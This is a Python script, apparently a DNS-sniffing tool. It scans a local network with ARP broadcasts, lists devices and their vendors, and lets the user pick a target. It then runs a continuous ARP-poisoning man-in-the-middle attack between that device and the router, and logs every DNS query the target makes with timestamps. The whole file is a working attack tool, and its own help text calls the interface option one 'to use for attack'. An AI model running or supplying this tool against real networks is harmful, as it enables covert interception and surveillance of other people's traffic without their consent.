

import argparse
import threading
from colorama import Fore,Style
from time import strftime , localtime
from scapy.all import arp_mitm, sniff, DNS , srp, Ether, ARP, conf
from mac_vendor_lookup import MacLookup, VendorNotFoundError

#env setup
conf.verb=0

parser= argparse.ArgumentParser( description='DNS sniffer tool')
parser.add_argument('--network', help="target device to watch", required=True)
parser.add_argument('--iface', help="interface to use for attack", required=True)
parser.add_argument('--router_ip', help='IP of home network', required=True)

opts = parser.parse_args()

# send broadcast message to see all online hosts
def arp_scan(network, iface):
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=network), timeout=10, iface=iface)

    print(f'{Fore.RED} #######   NETWORK DEVICES  ########{Style.RESET_ALL}')
    for i in ans:
        mac = i.answer[ARP].hwsrc
        ip = i.answer[ARP].psrc
        try:
            vendor = MacLookup().lookup(mac)
        except VendorNotFoundError:
            vendor = 'Unrecognized device'

        print(f"{Fore.BLUE} {ip}  ({mac}  {Fore.GREEN} {vendor}) {Style.RESET_ALL}")
    
    return input("\n Pick a device IP: ")

class Device():
    def __init__(self , router_ip, target_ip, iface):
        self.router_ip =opts.router_ip
        self.target_ip = target_ip
        self.iface= opts.iface
        

    def mitm(self):
        while True:
            try:
                arp_mitm( self.router_ip, self.target_ip, iface=self.iface)
            except OSError:
                # print('error ,ip is not up retrying')
                continue

    def capture(self):
        sniff(iface=self.iface, prn=self.dns, filter=f"src host {self.target_ip} and udp port 53")
        
    def dns(self, pkt):
        record = pkt[DNS].qd.qname.decode('utf-8').strip('.')
        time = strftime("%m/%d/%y %H:%M:%S", localtime())
        print(f'[{Fore.GREEN} {time} | {Fore.GREEN} {self.target_ip} -> {Fore.RED} {record} {Style.RESET_ALL}]')

    def watch(self):
        t1 = threading.Thread( target=self.mitm, args=())
        t2 = threading.Thread(target=self.capture, args=())

        t1.start()
        t2.start()







if __name__=="__main__":
    target_ip = arp_scan( opts.network, opts.iface)
    device =Device( opts.router_ip, target_ip,  opts.iface)
    device.watch()